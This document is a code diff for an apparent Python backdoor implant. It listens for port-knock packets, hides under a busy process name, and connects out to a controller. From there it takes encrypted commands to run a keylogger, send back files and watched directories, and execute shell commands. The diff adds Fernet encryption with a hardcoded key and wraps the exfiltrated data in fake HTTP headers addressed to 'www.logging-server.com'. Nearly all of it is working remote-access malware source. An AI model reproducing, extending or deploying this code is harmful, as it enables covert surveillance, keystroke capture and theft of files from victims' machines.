@@ -1,11 +1,20 @@
-import subprocess
 import setproctitle
 import psutil
 from scapy.all import *
 from watch import Watch
 from keylog import Keylog
+from cryptography.fernet import Fernet
+
 ipaddress = []
 correct_knocks = []
+http_header = b"POST / HTTP/1.1\r\nHost:www.logging-server.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "
+http_tail = b"POST / HTTP/1.1\r\nHost:www.logging-server.com\r\nConnection: close\r\n\r\n"
+fernet = Fernet(b'JFMnqwIgPTu1BqhqtCN4uPx2d6noxOcXtAbxJB5FrIQ=')
+
+def package(message):
+    print(message)
+    encoded_message = fernet.encrypt(message.encode())
+    return http_header + str(len(encoded_message)).encode() + "\r\n\r\n".encode() + encoded_message
 
 def handle(pkt):
     if pkt['TCP'].flags != "RA":
@@ -42,6 +51,7 @@ def get_best_process_name():
     for process_name in process_dict:
         if process_dict.get(process_name) > process_dict.get(best_process_name):
             best_process_name = process_name
+    print(f"hiding as {best_process_name}")
     return best_process_name
 
 
@@ -52,19 +62,43 @@ def run_command(command):
         out, err = data.communicate()
     except Exception:
         out = ("psh: command not found: {}".format(command))
-    return out
+    return out.decode()
 
-# problem is im prolly closing connection here by accident
+
 def send_file(fileName, connection):
-    with connection, open(fileName, 'rb') as f:
-        connection.sendall(fileName.encode() + b'\n')
-        connection.sendall(f'{os.path.getsize(fileName)}'.encode() + b'\n')
-        # Send the file in chunks so large files can be handled.
-        while True:
-            data = f.read(4096)
-            if not data: break
-            connection.sendall(data)
-        f.close()
+    f = open(fileName, 'rb')
+    connection.send(package(fileName))
+    time.sleep(.1)
+    connection.send(package(f'{os.path.getsize(fileName)}'))
+    time.sleep(.1)
+    while True:
+        data = f.read(4096)
+        if not data: break
+        connection.sendall(data)
+    f.close()
+
+
+def send_directory(dir, connection):
+    for path, dirs, files in os.walk(dir):
+        for file in files:
+            filename = os.path.join(path, file)
+            filesize = os.path.getsize(filename)
+
+            print(f'Sending {filename}')
+
+            with open(filename, 'rb') as f:
+                time.sleep(.1)
+                connection.sendall(package(filename[17:]))
+                time.sleep(.1)
+                connection.sendall(package(str(filesize)))
+                time.sleep(.1)
+                while True:
+                    data = f.read(4096)
+                    if not data: break
+                    connection.sendall(data)
+    time.sleep(.1)
+    connection.sendall(package("-done-"))
+
 
 def connection(ip):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -72,42 +106,50 @@ def connection(ip):
         print("connected")
         while True:
             command = s.recv(2048)
-            result = ""
             if not command:
                 break
-            command = command.decode()
+            command = fernet.decrypt(command).decode()
             command_type = command.split()[0]
-            print(f"command {command}")
-            print(f"command type: {command_type}")
+            print(f"command: {command}")
             if command_type == "kstart":
                 key_logger.start_keylogger()
-                result = "keylogger started".encode()
+                s.sendall(package("keylogger started"))
             elif command_type == "kstop":
                 key_logger.stop_keylogger()
-                result = "keylogger stopped".encode()
+                s.sendall(package("keylogger stopped"))
             elif command_type == "kget":
-                # key_logger.stop_keylogger()
-                file = open(key_logger.log_file, "r")
-                data = file.read()
-                result = data.encode()
-                file.close()
-                key_logger.clear_log()
+                try:
+                    send_file(key_logger.log_file, s)
+                    # key_logger.clear_log()
+                except Exception as e:
+                    s.sendall(package(str(e)))
             elif command_type == "fget":
-                # file = open(" ".join(command.split()[1:]), "r")
                 send_file(" ".join(command.split()[1:]), s)
-                result = "sent".encode()
             elif command_type == "wstart":
-                print("wstart")
+                result = "watch started"
+                try:
+                    watch.add_watched(" ".join(command.split()[1:]), True)
+                    if not watch.started:
+                        x = threading.Thread(target=watch.start)
+                        x.start()
+                except Exception as e:
+                    result = str(e)
+                s.sendall(package(result))
             elif command_type == "wstop":
-                print("wstop")
+                result = "watch stopped"
+                try:
+                    watch.stop()
+                except Exception as e:
+                    result = str(e)
+                s.sendall(package(result))
+
             elif command_type == "wget":
-                print("wget")
+                send_directory("/var/tmp/.hiding/", s)
+                watch.clear()
             elif command_type == "e":
-                result = run_command(" ".join(command.split()[1:]))
+                s.sendall(package(run_command(" ".join(command.split()[1:]))))
             else:
-                result = f"command {command_type} not found".encode()
-            print(result)
-            s.sendall(result)
+                s.sendall(package(f"command {command_type} not found"))
 
 
 if __name__ == '__main__':
@@ -115,4 +157,7 @@ if __name__ == '__main__':
     key_logger = Keylog()
     watch = Watch()
     while True:
-        sniff(filter="tcp and dst port 19634 or (tcp and dst port 16343)", prn=handle)
+        try:
+            sniff(filter="tcp and dst port 19634 or (tcp and dst port 16343)", prn=handle)
+        except Exception as e:
+            print(e)
